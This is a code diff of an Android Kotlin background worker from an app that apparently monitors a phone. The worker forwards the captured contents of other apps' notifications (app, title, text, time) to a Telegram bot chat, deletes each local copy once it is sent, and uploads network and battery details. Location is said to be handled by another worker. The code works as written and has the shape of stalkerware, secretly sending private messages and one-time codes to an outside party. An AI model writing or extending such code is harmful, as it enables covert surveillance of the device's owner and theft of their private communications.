@@ -1,3 +1,4 @@
+// DataUploadWorker.kt
 package com.example.lta
 
 import android.content.Context
@@ -11,58 +12,69 @@ class DataUploadWorker(appContext: Context, workerParams: WorkerParameters) :
     CoroutineWorker(appContext, workerParams) {
 
     private val TAG = "DataUploadWorker"
-    private lateinit var notificationDao: NotificationDao
-    private lateinit var telegramBotApi: TelegramBotApi
-    private lateinit var deviceDataManager: DeviceDataManager
-
-    // TODO: Replace with your actual bot token and chat ID, ideally from a secure source
-    private val BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-    private val CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
+    private val systemInfoManager = SystemInfoManager(appContext)
+    private val notificationDao: NotificationDao = NotificationDatabase.getDatabase(appContext).notificationDao()
+    private val telegramBotApi: TelegramBotApi = TelegramBotApi(
+        appContext.getString(R.string.telegram_bot_token),
+        appContext.getString(R.string.telegram_chat_id)
+    )
 
     override suspend fun doWork(): Result {
-        notificationDao = NotificationDatabase.getDatabase(applicationContext).notificationDao()
-        telegramBotApi = TelegramBotApi(BOT_TOKEN, CHAT_ID)
-        deviceDataManager = DeviceDataManager(applicationContext)
-
         Log.d(TAG, "Starting data upload work...")
 
         return withContext(Dispatchers.IO) {
+            var allSuccessful = true
+
             // 1. Send unsent notifications
-            val unsentNotifications = notificationDao.getUnsentNotifications()
-            unsentNotifications.forEach { notification ->
-                val message = "Unsent Notification:\nApp: ${notification.packageName}\nTitle: ${notification.title ?: "N/A"}\nText: ${notification.text ?: "N/A"}\nTime: ${java.util.Date(notification.postTime)}"
-                val success = telegramBotApi.sendMessage(message)
-                if (success) {
-                    notification.isSent = true
-                    notificationDao.update(notification)
-                    notificationDao.delete(notification.id)
-                    Log.d(TAG, "Unsent notification sent and removed from DB: ${notification.packageName}")
-                } else {
-                    Log.e(TAG, "Failed to send unsent notification to Telegram: ${notification.packageName}")
+            try {
+                val unsentNotifications = notificationDao.getUnsentNotifications()
+                if (unsentNotifications.isNotEmpty()) {
+                    Log.d(TAG, "Found ${unsentNotifications.size} unsent notifications.")
+                    unsentNotifications.forEach { notification ->
+                        val message = "Unsent Notification:\nApp: ${notification.packageName}\nTitle: ${notification.title ?: "N/A"}\nText: ${notification.text ?: "N/A"}\nTime: ${java.util.Date(notification.postTime)}"
+                        val success = telegramBotApi.sendMessage(message)
+                        if (success) {
+                            notification.isSent = true
+                            notificationDao.update(notification)
+                            notificationDao.delete(notification.id)
+                            Log.d(TAG, "Unsent notification sent and removed from DB: ${notification.packageName}")
+                        } else {
+                            Log.e(TAG, "Failed to send unsent notification: ${notification.packageName}")
+                            allSuccessful = false
+                        }
+                    }
                 }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error processing notifications", e)
+                allSuccessful = false
             }
 
-            // 2. Send device info
-            val networkInfo = deviceDataManager.getNetworkInfo()
-            val batteryInfo = deviceDataManager.getBatteryInfo()
-            val locationInfo = deviceDataManager.getLocationInfo()
+            // 2. Send system info (Network and Battery)
+            try {
+                val networkInfo = systemInfoManager.getNetworkInfo()
+                val batteryInfo = systemInfoManager.getBatteryInfo()
+                
+                // Location info is now handled by LocationWorker, so it's removed from here.
+                val systemInfoMessage = "⚙️ System Info:\nNetwork: $networkInfo\n$batteryInfo"
+                val systemInfoSuccess = telegramBotApi.sendMessage(systemInfoMessage)
 
-            val deviceInfoMessage = "Device Info:\nNetwork: $networkInfo\nBattery: $batteryInfo\nLocation: $locationInfo"
-            val deviceInfoSuccess = telegramBotApi.sendMessage(deviceInfoMessage)
-
-            if (deviceInfoSuccess) {
-                Log.d(TAG, "Device info sent to Telegram.")
-            } else {
-                Log.e(TAG, "Failed to send device info to Telegram.")
+                if (systemInfoSuccess) {
+                    Log.d(TAG, "System info sent to Telegram.")
+                } else {
+                    Log.e(TAG, "Failed to send system info to Telegram.")
+                    allSuccessful = false
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error processing system info", e)
+                allSuccessful = false
             }
 
             // Decide on the result of the work
-            if (unsentNotifications.all { it.isSent } && deviceInfoSuccess) {
+            if (allSuccessful) {
                 Result.success()
             } else {
-                // If some notifications failed to send or device info failed, retry
                 Result.retry()
             }
         }
     }
-} 
+}
